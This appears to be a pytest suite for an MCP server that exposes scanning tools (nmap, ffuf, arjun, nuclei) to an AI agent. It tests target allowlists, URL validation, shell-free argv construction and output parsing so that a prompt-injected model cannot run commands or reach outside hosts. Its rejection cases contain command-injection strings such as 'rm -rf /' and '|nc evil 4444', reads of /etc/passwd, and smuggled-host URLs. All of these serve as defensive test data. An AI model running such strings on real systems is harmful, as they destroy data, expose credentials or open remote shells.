"""Tests for the API-RedBox-MCP allowlist / no-passthrough invariants and the
structured-output contract.

The reason this project exists is that a hallucinating or prompt-injected LLM
must not be able to reach arbitrary command execution, and must not be able to
point the tools at hosts outside the engagement. These tests assert the layers
that guarantee it:

  1. Schema layer  — FastMCP/pydantic rejects out-of-allowlist values (enum,
     regex pattern) *before* our code runs. Exercised via ``mcp.call_tool``.
  2. Handler layer — the ``_validate_*`` helpers reject non-IP / non-URL inputs
     and any target not on the hardcoded ``ALLOWED_TARGETS`` list, and each tool
     routes through ``run_binary`` with an exact argv list, so shell
     metacharacters are inert.

Plus the structured output: each tool returns a ``ScanResult`` (status + exit
code + parsed findings + raw), and the per-tool parsers degrade to ``[]`` on
malformed output while preserving ``raw``.

Real binaries are never executed: ``run_binary`` is always patched.
"""

from __future__ import annotations

import asyncio
from unittest.mock import patch

import pytest
from mcp.server.fastmcp.exceptions import ToolError

import server

ALLOWED = "192.168.68.100"  # the one hardcoded target (server.ALLOWED_TARGETS)
NOT_ALLOWED = "8.8.8.8"  # a perfectly valid IP that must still be refused


def call_tool(name: str, arguments: dict):
    """Drive the async framework entrypoint (schema validation + dispatch) synchronously."""
    return asyncio.run(server.mcp.call_tool(name, arguments))


def _exe(stdout="", returncode=0, stderr="", timed_out=False):
    """Build a canned Execution for patching run_binary."""
    return server.Execution(
        command=[], returncode=returncode, stdout=stdout, stderr=stderr, timed_out=timed_out
    )


# ---------------------------------------------------------------------------
# Sanity: the seeded allowlist is what the tests assume
# ---------------------------------------------------------------------------


def test_allowlist_is_seeded_with_the_single_target():
    assert ALLOWED in server.ALLOWED_TARGETS


# ---------------------------------------------------------------------------
# Handler layer — validators
# ---------------------------------------------------------------------------


class TestValidateTargetIp:
    def test_accepts_allowlisted_ip(self):
        assert server._validate_target_ip(ALLOWED) == ALLOWED

    @pytest.mark.parametrize(
        "value",
        ["8.8.8.8", "10.0.0.5", "127.0.0.1", "::1", "192.168.68.101", "192.168.69.100"],
    )
    def test_rejects_valid_ip_not_on_allowlist(self, value):
        with pytest.raises(ValueError):
            server._validate_target_ip(value)

    @pytest.mark.parametrize(
        "value",
        [
            "example.com",
            "api.target.com",
            "localhost",
            "192.168.68.100; rm -rf /",
            "192.168.68.100 && cat /etc/passwd",
            "$(whoami)",
            "192.168.68.100|nc evil 4444",
            "192.168.68.100 -oN /tmp/out",
            "999.999.999.999",
            "",
        ],
    )
    def test_rejects_non_ip(self, value):
        with pytest.raises(ValueError):
            server._validate_target_ip(value)


class TestValidateHttpUrl:
    @pytest.mark.parametrize(
        "value",
        [
            "http://192.168.68.100",
            "https://192.168.68.100/v1",
            "http://192.168.68.100/FUZZ",
            "http://192.168.68.100:8080/api",
        ],
    )
    def test_accepts_allowlisted_http_urls(self, value):
        assert server._validate_http_url(value) == value

    @pytest.mark.parametrize(
        "value",
        [
            "ftp://192.168.68.100/file",
            "file:///etc/passwd",
            "javascript:alert(1)",
            "ssh://192.168.68.100",
            "gopher://192.168.68.100/_",
            "evil.com",
            "//192.168.68.100",
            "",
            " http://192.168.68.100",
        ],
    )
    def test_rejects_non_http(self, value):
        with pytest.raises(ValueError):
            server._validate_http_url(value)

    @pytest.mark.parametrize(
        "value", ["http://8.8.8.8/", "https://10.0.0.5/api", "http://192.168.68.101/"]
    )
    def test_rejects_url_host_not_on_allowlist(self, value):
        with pytest.raises(ValueError):
            server._validate_http_url(value)

    @pytest.mark.parametrize(
        "value",
        [
            "https://api.target.com",
            "http://localhost/",
            "http://192.168.68.100.evil.com/",
            "http://192.168.68.100@evil.com/",
        ],
    )
    def test_rejects_hostname_and_smuggled_hosts(self, value):
        with pytest.raises(ValueError):
            server._validate_http_url(value)


class TestWordlistResolution:
    def test_all_aliases_resolve_under_wordlist_dir(self):
        prefix = str(server.WORDLIST_DIR) + "/"
        for alias in server.WORDLISTS:
            assert server._resolve_wordlist(alias).startswith(prefix)

    def test_wordlist_values_contain_no_path_traversal(self):
        for filename in server.WORDLISTS.values():
            assert "/" not in filename
            assert ".." not in filename

    def test_unknown_alias_raises(self):
        with pytest.raises(KeyError):
            server._resolve_wordlist("../../etc/passwd")


# ---------------------------------------------------------------------------
# Execution primitive — no shell, bounded by a timeout, structured outcome
# ---------------------------------------------------------------------------


class TestRunBinary:
    def test_runs_without_shell_and_passes_timeout(self):
        import subprocess as sp

        completed = sp.CompletedProcess(args=["nmap"], returncode=0, stdout="ok", stderr="")
        with patch.object(server.subprocess, "run", return_value=completed) as run:
            exe = server.run_binary(["nmap", "-Pn"], timeout=123)
        assert run.call_args.kwargs["shell"] is False
        assert run.call_args.kwargs["timeout"] == 123
        assert exe.returncode == 0
        assert exe.stdout == "ok"
        assert exe.timed_out is False

    def test_timeout_is_reported_not_raised(self):
        import subprocess as sp

        with patch.object(
            server.subprocess, "run", side_effect=sp.TimeoutExpired(cmd="nmap", timeout=5)
        ):
            exe = server.run_binary(["nmap"], timeout=5)
        assert exe.timed_out is True
        assert exe.returncode is None
        assert "timed out" in exe.stderr

    def test_missing_binary_is_reported_not_raised(self):
        with patch.object(server.subprocess, "run", side_effect=FileNotFoundError()):
            exe = server.run_binary(["nope"])
        assert exe.returncode is None
        assert "binary not found" in exe.stderr


# ---------------------------------------------------------------------------
# Handler layer — each tool builds an exact argv list (no command string)
# ---------------------------------------------------------------------------


class TestToolCommandConstruction:
    def test_nmap_builds_expected_argv(self):
        with patch.object(server, "run_binary", return_value=_exe()) as rb:
            server.nmap_scan(ALLOWED)
        rb.assert_called_once_with(
            ["nmap", "-Pn", "-sT", "-p", "1-1000", "-oX", "-", ALLOWED],
            timeout=server.TIMEOUTS["nmap"],
        )

    def test_nmap_version_detection_is_additive_over_connect_scan(self):
        # -sV must never replace -sT: a bare -sV lets nmap fall back to a SYN
        # scan that needs a raw socket the cap-dropped sandbox denies.
        with patch.object(server, "run_binary", return_value=_exe()) as rb:
            server.nmap_scan(ALLOWED, ports="80,443", scan_type="-sV")
        rb.assert_called_once_with(
            ["nmap", "-Pn", "-sT", "-sV", "-p", "80,443", "-oX", "-", ALLOWED],
            timeout=server.TIMEOUTS["nmap"],
        )

    def test_nmap_rejects_hostname_before_exec(self):
        with patch.object(server, "run_binary") as rb:
            with pytest.raises(ValueError):
                server.nmap_scan("api.target.com")
        rb.assert_not_called()

    def test_nmap_rejects_target_not_on_allowlist_before_exec(self):
        with patch.object(server, "run_binary") as rb:
            with pytest.raises(ValueError):
                server.nmap_scan(NOT_ALLOWED)
        rb.assert_not_called()

    def test_ffuf_builds_expected_argv_with_json_report(self):
        with patch.object(server, "run_binary", return_value=_exe()) as rb:
            server.ffuf_discover("http://192.168.68.100/FUZZ", wordlist="common")
        cmd = rb.call_args.args[0]
        assert cmd[:10] == [
            "ffuf",
            "-u",
            "http://192.168.68.100/FUZZ",
            "-w",
            server._resolve_wordlist("common"),
            "-noninteractive",
            "-s",
            "-of",
            "json",
            "-o",
        ]
        assert cmd[10].endswith(".json")  # temp report path
        assert rb.call_args.kwargs["timeout"] == server.TIMEOUTS["ffuf"]

    def test_ffuf_requires_fuzz_keyword(self):
        with patch.object(server, "run_binary") as rb:
            with pytest.raises(ValueError):
                server.ffuf_discover("http://192.168.68.100/")
        rb.assert_not_called()

    def test_ffuf_rejects_non_http(self):
        with patch.object(server, "run_binary") as rb:
            with pytest.raises(ValueError):
                server.ffuf_discover("file:///etc/passwd?FUZZ")
        rb.assert_not_called()

    def test_arjun_builds_expected_argv_with_json_report(self):
        with patch.object(server, "run_binary", return_value=_exe()) as rb:
            server.arjun_params("http://192.168.68.100/api", method="POST")
        cmd = rb.call_args.args[0]
        assert cmd[:6] == ["arjun", "-u", "http://192.168.68.100/api", "-m", "POST", "-oJ"]
        assert cmd[6].endswith(".json")
        assert rb.call_args.kwargs["timeout"] == server.TIMEOUTS["arjun"]

    def test_arjun_rejects_non_http(self):
        with patch.object(server, "run_binary") as rb:
            with pytest.raises(ValueError):
                server.arjun_params("ftp://192.168.68.100")
        rb.assert_not_called()

    def test_url_host_not_on_allowlist_rejected_before_exec(self):
        with patch.object(server, "run_binary") as rb:
            with pytest.raises(ValueError):
                server.arjun_params("http://8.8.8.8/api")
        rb.assert_not_called()

    def test_nuclei_builds_expected_argv(self):
        with patch.object(server, "run_binary", return_value=_exe()) as rb:
            server.nuclei_scan("https://192.168.68.100/api")
        rb.assert_called_once_with(
            [
                "nuclei",
                "-u",
                "https://192.168.68.100/api",
                "-tags",
                "rest,api",
                "-templates",
                server.NUCLEI_TEMPLATE_DIR,
                "-disable-update-check",
                "-jsonl",
                "-silent",
            ],
            timeout=server.TIMEOUTS["nuclei"],
        )

    def test_nuclei_rejects_non_http(self):
        with patch.object(server, "run_binary") as rb:
            with pytest.raises(ValueError):
                server.nuclei_scan("evil.com")
        rb.assert_not_called()

    def test_shell_metacharacters_in_url_stay_a_single_argv_token(self):
        # A URL passes scheme + allowlist validation but may still contain
        # metacharacters. Defense in depth: it reaches the binary as ONE argv
        # element, so with shell=False the metacharacters are inert.
        nasty = "http://192.168.68.100/$(rm -rf /);id|nc evil 4444"
        with patch.object(server, "run_binary", return_value=_exe()) as rb:
            server.arjun_params(nasty)
        cmd = rb.call_args.args[0]
        assert cmd[:5] == ["arjun", "-u", nasty, "-m", "GET"]


# ---------------------------------------------------------------------------
# Output parsers — defensive: malformed output yields [] (raw is preserved)
# ---------------------------------------------------------------------------


class TestParsers:
    NMAP_XML = (
        '<?xml version="1.0"?><nmaprun><host><ports>'
        '<port protocol="tcp" portid="80"><state state="open"/>'
        '<service name="http" product="nginx" version="1.25"/></port>'
        '<port protocol="tcp" portid="22"><state state="closed"/></port>'
        "</ports></host></nmaprun>"
    )

    def test_nmap_xml_extracts_ports(self):
        out = server._parse_nmap_xml(self.NMAP_XML)
        assert out[0] == {
            "port": 80,
            "protocol": "tcp",
            "state": "open",
            "service": "http",
            "product": "nginx",
            "version": "1.25",
        }
        assert out[1]["port"] == 22 and out[1]["state"] == "closed"

    @pytest.mark.parametrize("bad", ["", "not xml", "<nmaprun><unclosed>"])
    def test_nmap_xml_malformed_yields_empty(self, bad):
        assert server._parse_nmap_xml(bad) == []

    def test_ffuf_json_extracts_results(self):
        text = '{"results":[{"url":"http://x/admin","status":200,"length":12,"words":3,"lines":1}]}'
        assert server._parse_ffuf_json(text) == [
            {"url": "http://x/admin", "status": 200, "length": 12, "words": 3, "lines": 1}
        ]

    @pytest.mark.parametrize("bad", ["", "{", "[]", '{"no_results": 1}'])
    def test_ffuf_json_malformed_or_empty_yields_empty(self, bad):
        assert server._parse_ffuf_json(bad) == []

    def test_arjun_json_extracts_params(self):
        assert server._parse_arjun_json('{"http://x/api":["id","debug"]}') == [
            {"url": "http://x/api", "params": ["id", "debug"]}
        ]

    @pytest.mark.parametrize("bad", ["", "not json", "[1,2,3]"])
    def test_arjun_json_malformed_yields_empty(self, bad):
        assert server._parse_arjun_json(bad) == []

    def test_nuclei_jsonl_extracts_findings(self):
        text = (
            '{"template-id":"tls","info":{"name":"TLS","severity":"low"},'
            '"matched-at":"x:443","type":"ssl"}\n\n'
            "garbage line that is not json\n"
        )
        out = server._parse_nuclei_jsonl(text)
        assert out == [
            {
                "template_id": "tls",
                "name": "TLS",
                "severity": "low",
                "matched_at": "x:443",
                "type": "ssl",
            }
        ]

    def test_nuclei_jsonl_empty_yields_empty(self):
        assert server._parse_nuclei_jsonl("") == []


# ---------------------------------------------------------------------------
# Structured result envelope — status derived from the execution outcome
# ---------------------------------------------------------------------------


class TestResultEnvelope:
    def test_completed_status_and_findings(self):
        exe = _exe(stdout=TestParsers.NMAP_XML, returncode=0)
        with patch.object(server, "run_binary", return_value=exe):
            r = server.nmap_scan(ALLOWED)
        assert r.tool == "nmap"
        assert r.target == ALLOWED
        assert r.status == "completed"
        assert r.exit_code == 0
        assert len(r.findings) == 2
        assert "<nmaprun>" in r.raw

    def test_timed_out_status(self):
        with patch.object(server, "run_binary", return_value=_exe(returncode=None, timed_out=True)):
            r = server.nmap_scan(ALLOWED)
        assert r.status == "timed_out"
        assert r.exit_code is None
        assert r.findings == []

    def test_error_status_falls_back_to_stderr_for_raw(self):
        with patch.object(server, "run_binary", return_value=_exe(returncode=2, stderr="boom")):
            r = server.nmap_scan(ALLOWED)
        assert r.status == "error"
        assert r.exit_code == 2
        assert r.raw == "boom"


# ---------------------------------------------------------------------------
# Schema layer — the framework rejects out-of-allowlist values before dispatch
# ---------------------------------------------------------------------------


class TestSchemaLayerRejectsOutOfAllowlist:
    def test_nmap_rejects_scan_type_outside_enum(self):
        with patch.object(server, "run_binary", return_value=_exe()):
            with pytest.raises(ToolError):
                call_tool("nmap_scan", {"target": ALLOWED, "scan_type": "-O"})

    def test_nmap_rejects_ports_with_shell_metacharacters(self):
        with patch.object(server, "run_binary", return_value=_exe()):
            with pytest.raises(ToolError):
                call_tool("nmap_scan", {"target": ALLOWED, "ports": "1; rm -rf /"})

    def test_nmap_rejects_overlong_ports(self):
        with patch.object(server, "run_binary", return_value=_exe()):
            with pytest.raises(ToolError):
                call_tool("nmap_scan", {"target": ALLOWED, "ports": "1," * 40})

    def test_ffuf_rejects_arbitrary_wordlist_path(self):
        with patch.object(server, "run_binary", return_value=_exe()):
            with pytest.raises(ToolError):
                call_tool(
                    "ffuf_discover",
                    {"url": "http://192.168.68.100/FUZZ", "wordlist": "/etc/passwd"},
                )

    def test_arjun_rejects_method_outside_enum(self):
        with patch.object(server, "run_binary", return_value=_exe()):
            with pytest.raises(ToolError):
                call_tool(
                    "arjun_params", {"url": "http://192.168.68.100", "method": "DELETE"}
                )

    def test_valid_call_returns_structured_result(self):
        with patch.object(server, "run_binary", return_value=_exe(returncode=0)):
            _content, structured = call_tool("nmap_scan", {"target": ALLOWED})
        assert structured["tool"] == "nmap"
        assert structured["target"] == ALLOWED
        assert structured["status"] == "completed"
        assert "findings" in structured and "raw" in structured


# ---------------------------------------------------------------------------
# Target allowlist enforced through the framework (handler ValueError -> ToolError)
# ---------------------------------------------------------------------------


class TestTargetAllowlistThroughFramework:
    def test_nmap_target_not_on_allowlist_rejected(self):
        with patch.object(server, "run_binary", return_value=_exe()):
            with pytest.raises(ToolError):
                call_tool("nmap_scan", {"target": NOT_ALLOWED})

    def test_url_tool_host_not_on_allowlist_rejected(self):
        with patch.object(server, "run_binary", return_value=_exe()):
            with pytest.raises(ToolError):
                call_tool("nuclei_scan", {"url": "http://8.8.8.8/api"})


# ---------------------------------------------------------------------------
# The hard invariant (SPECS.md §3): no tool exposes a free-form passthrough field
# ---------------------------------------------------------------------------


def test_no_tool_exposes_a_freeform_command_field():
    banned = {
        "command",
        "cmd",
        "args",
        "argv",
        "extra_args",
        "additional_flags",
        "additionalflags",
        "flags",
        "options",
        "shell",
        "exec",
        "raw",
    }
    for tool in asyncio.run(server.mcp.list_tools()):
        props = {k.lower() for k in tool.inputSchema.get("properties", {})}
        leaked = props & banned
        assert not leaked, f"{tool.name} exposes banned passthrough field(s): {leaked}"
